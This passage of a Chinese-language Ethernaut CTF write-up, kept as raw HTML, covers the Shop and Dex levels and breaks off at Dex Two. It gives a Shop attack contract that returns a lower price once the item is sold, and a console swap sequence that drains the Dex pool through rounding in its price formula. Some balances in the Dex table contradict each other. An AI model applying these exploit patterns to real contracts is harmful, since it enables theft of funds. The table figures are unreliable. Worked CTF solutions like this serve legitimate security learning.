id="shop"><a class="markdownIt-Anchor" href="#shop"></a> Shop</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Buyer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Shop</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> price <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> isSold<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        Buyer _buyer <span class="token operator">=</span> <span class="token function">Buyer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>_buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> price <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isSold<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            isSold <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            price <span class="token operator">=</span> _buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Сan you get the item from the shop for less than the price asked?</p><p>Things that might help:<br>Shop expects to be used from a Buyer<br>Understanding restrictions of view functions<br>要求少于规定的price。提供price查询方法，当购买时查询一下buyer.price。购买成功后记录buyer.price。也就是我们只要在成功购买后给一个更低的price即可。<br>本题是一个购买合约，要求购买时价格小于规定的价格。</p><h4 id="analyse-8"><a class="markdownIt-Anchor" href="#analyse-8"></a> Analyse</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">if</span> <span class="token punctuation">(</span>_buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> price <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isSold<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    isSold <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    price <span class="token operator">=</span> _buyer<span class="token punctuation">.</span><span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现第一次使用buy函数时时false，但是当第二次使用该函数的时候，isSold为true，就在这里修改price即可。</p><h4 id="attack-7"><a class="markdownIt-Anchor" href="#attack-7"></a> Attack</h4><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">IShop</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span><span class="token punctuation">&#123;</span>    IShop  <span class="token keyword">public</span> shop<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        shop <span class="token operator">=</span> <span class="token function">IShop</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">price</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span>  <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> shop<span class="token punctuation">.</span><span class="token function">isSold</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token number">0</span> <span class="token punctuation">:</span><span class="token number">100</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">buyAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>        shop<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据isSold（）函数修改price（）函数的返回值</p><h3 id="dex"><a class="markdownIt-Anchor" href="#dex"></a> Dex</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/access/Ownable.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Dex</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> token1<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> token2<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setTokens</span><span class="token punctuation">(</span><span class="token builtin">address</span> _token1<span class="token punctuation">,</span> <span class="token builtin">address</span> _token2<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>        token1 <span class="token operator">=</span> _token1<span class="token punctuation">;</span>        token2 <span class="token operator">=</span> _token2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">addLiquidity</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_address<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>token_address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">SwappableToken</span><span class="token punctuation">(</span>token2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> token<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">SwappableToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a &quot;bad&quot; price of the assets. Quick noteNormally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we&#39;ve just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, &lt;uint amount&gt;) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.  Things that might help:How is the price of the token calculated?How does the swap method work?How do you approve a transaction of an ERC20?Theres more than one way to interact with a contract!Remix might helpWhat does &quot;At Address&quot; do?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通关条件： 获取内部所有代币，dex拥有100 token1 和100 token2，而合约拥有10 token1 和10 token2。</p><h4 id="analyse-9"><a class="markdownIt-Anchor" href="#analyse-9"></a> Analyse</h4><p>先看SwappableToken</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">SwappableToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> _dex<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> dexInstance<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> name<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol<span class="token punctuation">,</span> <span class="token builtin">uint256</span> initialSupply<span class="token punctuation">)</span>        <span class="token function">ERC20</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> symbol<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">_mint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>        _dex <span class="token operator">=</span> dexInstance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>owner <span class="token operator">!=</span> _dex<span class="token punctuation">,</span> <span class="token string">"InvalidApprover"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        super<span class="token punctuation">.</span><span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的ERC20代币，在构造函数中为msg.sender发行initialSupply数量，重写approve，防止_dex授权<br>再看Dex ，主要实现了token1和token2的交换</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token1 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">==</span> token2 <span class="token operator">&amp;&amp;</span> to <span class="token operator">==</span> token1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"Invalid tokens"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"Not enough to swap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> swapAmount <span class="token operator">=</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> swapAmount<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个require检测token1到token2的交换或者反过来。<br>然后是计算兑换价格</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">getSwapPrice</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>amount <span class="token operator">*</span> <span class="token function">IERC20</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">IERC20</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也就是说当兑换token y的时候，amount* token y的余额/token x的余额，而solidity的计算是向下取整的。</p><h4 id="attack-8"><a class="markdownIt-Anchor" href="#attack-8"></a> Attack</h4><p>最开始我们是10a和10b，dex则是100a和100b，所以第一次计算就变成了0a和20b，dex变成110a和90b。第二次兑换就变成了20*110b/90a=24a<br>所以依次计算。</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left"></th><th style="text-align:left">token1</th><th style="text-align:left">token2</th></tr></thead><tbody><tr><td style="text-align:left">initialize</td><td style="text-align:left">pool</td><td style="text-align:left">100</td><td style="text-align:left">100</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">10</td><td style="text-align:left">10</td></tr><tr><td style="text-align:left">token1-&gt; token2: 10</td><td style="text-align:left">pool</td><td style="text-align:left">110</td><td style="text-align:left">90</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">0</td><td style="text-align:left">24</td></tr><tr><td style="text-align:left">token2-&gt;token1: 20</td><td style="text-align:left">pool</td><td style="text-align:left">86</td><td style="text-align:left">110</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">24</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">token1-&gt;token2: 24</td><td style="text-align:left">pool</td><td style="text-align:left">110</td><td style="text-align:left">80</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">0</td><td style="text-align:left">30</td></tr><tr><td style="text-align:left">token2-&gt; token1: 30</td><td style="text-align:left">pool</td><td style="text-align:left">69</td><td style="text-align:left">110</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">41</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">token1-&gt;token2: 41</td><td style="text-align:left">pool</td><td style="text-align:left">110</td><td style="text-align:left">45</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">0</td><td style="text-align:left">65</td></tr><tr><td style="text-align:left">token2-&gt;token1: 45</td><td style="text-align:left">pool</td><td style="text-align:left">110</td><td style="text-align:left">90</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">player</td><td style="text-align:left">45</td><td style="text-align:left">110</td></tr></tbody></table><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 授权合约转账player的两个token</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token comment">// 设置两个token变量</span><span class="token keyword">const</span> token1 <span class="token operator">=</span> <span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">token1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> token2 <span class="token operator">=</span> <span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">token2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 执行来回swap方法</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token1<span class="token punctuation">,</span>token2<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token2<span class="token punctuation">,</span>token1<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token1<span class="token punctuation">,</span>token2<span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token2<span class="token punctuation">,</span>token1<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token1<span class="token punctuation">,</span>token2<span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">)</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>token2<span class="token punctuation">,</span>token1<span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token comment">// 检查合约中token2的数量</span><span class="token punctuation">(</span><span class="token keyword">await</span> contract<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span>token1<span class="token punctuation">,</span>instance<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dex-two"><a class="markdownIt-Anchor" href="#dex-two"></a> Dex Two</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/IERC20.sol"</span><span class="token punctuation">;</span><span class="token 